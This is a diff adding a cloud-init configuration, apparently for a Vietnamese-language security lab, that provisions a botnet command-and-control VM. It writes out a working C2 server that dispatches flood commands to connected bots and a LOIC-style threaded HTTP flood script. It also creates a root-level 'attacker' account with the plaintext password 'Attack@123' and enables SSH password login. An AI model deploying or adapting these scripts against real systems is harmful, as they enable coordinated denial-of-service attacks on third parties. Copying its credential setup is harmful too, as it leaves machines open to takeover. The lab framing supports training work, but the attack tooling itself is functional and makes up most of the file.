@@ -1,0 +1,157 @@
+#cloud-config
+# VM1: ATT-C2-Server - Botnet Command & Control
+hostname: att-c2-server
+users:
+  - name: attacker
+    sudo: ALL=(ALL) NOPASSWD:ALL
+    shell: /bin/bash
+    lock_passwd: false
+    passwd: "$6$rounds=4096$saltsalt$hashedpassword"
+    plain_text_passwd: "Attack@123"
+
+chpasswd:
+  list: |
+    root:Attack@123
+    attacker:Attack@123
+  expire: false
+
+ssh_pwauth: true
+
+write_files:
+  # Script C2 Server – điều phối botnet
+  - path: /opt/botnet/c2_server.py
+    permissions: '0755'
+    content: |
+      #!/usr/bin/env python3
+      """
+      ATT Lab - Botnet C&C Server (mô phỏng học tập)
+      Lắng nghe bot kết nối và gửi lệnh tấn công
+      """
+      import socket, threading, time, json, sys
+
+      BOTS = {}  # {addr: socket}
+      C2_PORT = 9999
+      TARGET_IP = "10.10.10.x"   # Sẽ cập nhật IP victim
+      TARGET_PORT = 80
+
+      def handle_bot(conn, addr):
+          bot_id = f"{addr[0]}:{addr[1]}"
+          BOTS[bot_id] = conn
+          print(f"[+] Bot kết nối: {bot_id} | Tổng bots: {len(BOTS)}")
+          try:
+              while True:
+                  data = conn.recv(1024)
+                  if not data: break
+                  print(f"[BOT {bot_id}] {data.decode().strip()}")
+          except: pass
+          finally:
+              del BOTS[bot_id]
+              conn.close()
+              print(f"[-] Bot ngắt: {bot_id}")
+
+      def send_attack_command(target_ip, target_port, duration=30, attack_type="http"):
+          cmd = json.dumps({
+              "cmd": "attack",
+              "target_ip": target_ip,
+              "target_port": target_port,
+              "duration": duration,
+              "type": attack_type
+          })
+          dead = []
+          sent = 0
+          for bid, conn in BOTS.items():
+              try:
+                  conn.send((cmd + "\n").encode())
+                  sent += 1
+              except:
+                  dead.append(bid)
+          for bid in dead:
+              del BOTS[bid]
+          print(f"[C2] Lệnh tấn công gửi tới {sent} bots: {target_ip}:{target_port} ({attack_type}, {duration}s)")
+
+      def cli():
+          print("\n=== ATT Lab - Botnet C2 Console ===")
+          print("Lệnh: attack <target_ip> <port> <duration> <type(http/syn/udp)>")
+          print("      bots  -> xem danh sách bot")
+          print("      quit  -> thoát\n")
+          while True:
+              try:
+                  cmd = input("C2> ").strip().split()
+                  if not cmd: continue
+                  if cmd[0] == "bots":
+                      print(f"Online bots ({len(BOTS)}): {list(BOTS.keys())}")
+                  elif cmd[0] == "attack" and len(cmd) >= 4:
+                      send_attack_command(cmd[1], int(cmd[2]),
+                          int(cmd[3]) if len(cmd)>3 else 30,
+                          cmd[4] if len(cmd)>4 else "http")
+                  elif cmd[0] == "quit":
+                      sys.exit(0)
+              except (KeyboardInterrupt, EOFError):
+                  print("\nThoát C2...")
+                  sys.exit(0)
+
+      # Main
+      server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+      server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+      server.bind(("0.0.0.0", C2_PORT))
+      server.listen(50)
+      print(f"[C2] Server lắng nghe trên port {C2_PORT}...")
+
+      threading.Thread(target=cli, daemon=True).start()
+
+      while True:
+          try:
+              conn, addr = server.accept()
+              threading.Thread(target=handle_bot, args=(conn, addr), daemon=True).start()
+          except KeyboardInterrupt:
+              break
+
+  # LOIC-style HTTP Flood script
+  - path: /opt/botnet/http_flood.py
+    permissions: '0755'
+    content: |
+      #!/usr/bin/env python3
+      """HTTP Flood - Mô phỏng LOIC (Low Orbit Ion Cannon)"""
+      import threading, requests, time, sys, argparse
+
+      parser = argparse.ArgumentParser()
+      parser.add_argument("--target", default="http://10.10.10.30")
+      parser.add_argument("--threads", type=int, default=100)
+      parser.add_argument("--duration", type=int, default=30)
+      args = parser.parse_args()
+
+      stop_event = threading.Event()
+      stats = {"sent": 0, "errors": 0}
+      lock = threading.Lock()
+
+      def flood():
+          session = requests.Session()
+          while not stop_event.is_set():
+              try:
+                  r = session.get(args.target, timeout=3)
+                  with lock:
+                      stats["sent"] += 1
+              except:
+                  with lock:
+                      stats["errors"] += 1
+
+      print(f"[LOIC] HTTP Flood -> {args.target} | {args.threads} threads | {args.duration}s")
+      threads = [threading.Thread(target=flood) for _ in range(args.threads)]
+      [t.start() for t in threads]
+
+      start = time.time()
+      while time.time() - start < args.duration:
+          elapsed = int(time.time() - start)
+          print(f"\r[{elapsed:3d}s] Sent: {stats['sent']:6d} | Errors: {stats['errors']:4d}", end="", flush=True)
+          time.sleep(1)
+
+      stop_event.set()
+      print(f"\n[LOIC] Hoàn tất! Tổng: {stats['sent']} requests, {stats['errors']} lỗi")
+
+runcmd:
+  - apt-get update -y -q
+  - apt-get install -y hping3 nmap curl wget python3 python3-pip python3-requests netcat-openbsd iputils-ping net-tools tcpdump slowhttptest
+  - pip3 install requests --quiet
+  - chmod +x /opt/botnet/*.py
+  - echo "C2 Server setup complete" > /var/log/att-setup.log
+  - echo "IP: $(hostname -I)" >> /var/log/att-setup.log
